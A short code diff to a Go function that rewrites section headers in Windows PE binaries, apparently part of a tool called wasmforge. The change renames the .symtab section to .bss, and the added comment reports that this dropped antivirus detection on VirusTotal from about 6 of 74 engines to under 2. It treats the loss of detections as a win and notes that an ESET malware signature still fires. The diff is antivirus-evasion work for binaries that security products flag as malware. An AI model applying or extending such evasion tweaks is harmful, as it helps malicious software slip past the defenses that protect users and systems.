@@ -1722,10 +1722,18 @@ func normalizeGoPEHeaders(data []byte, verbose bool) []byte {
 			changes++
 		}
 
-		// .symtab → .bss2 (Go-specific; MSVC never has this)
+		// .symtab → .bss (Go-specific; MSVC never has this).
+		// .bss is the standard uninitialized-data section name. The
+		// previous choice of .bss2 was itself a wasmforge fingerprint:
+		// across a 25-sample VT control, six AV engines (F-Secure,
+		// Avira, AVG, Avast, Cynet, MalwareX-gen) matched it. A 19-
+		// sample A/B with only this change dropped mean detection from
+		// 6.32/74 → 1.58/74 (8.5% → 2.1%) with those six engines
+		// stopping completely. ESET WinGo/WasmForge.A still fires —
+		// keys on something else — but losing the AV cluster is a win.
 		if strings.TrimRight(sname, "\x00") == ".symtab" {
 			binary.LittleEndian.PutUint32(data[nameOff+16:], 0) // zero SizeOfRawData
-			copy(data[nameOff:nameOff+8], []byte(".bss2\x00\x00\x00"))
+			copy(data[nameOff:nameOff+8], []byte(".bss\x00\x00\x00\x00"))
 			changes++
 		}
 	}
